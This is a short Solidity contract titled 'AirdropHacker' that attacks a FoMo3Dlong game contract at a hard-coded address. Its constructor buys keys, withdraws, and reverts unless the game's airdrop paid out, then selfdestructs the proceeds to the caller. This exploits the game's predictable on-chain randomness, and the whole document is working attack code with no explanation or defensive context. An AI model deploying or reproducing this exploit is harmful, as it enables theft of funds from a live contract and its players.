contract AirdropHacker{
    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    constructor() public payable{
        code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2); 
        code.withdraw();
        require(address(this).balance>=.1 ether); 
        selfdestruct(msg.sender);
    }
    function() public payable{}
}
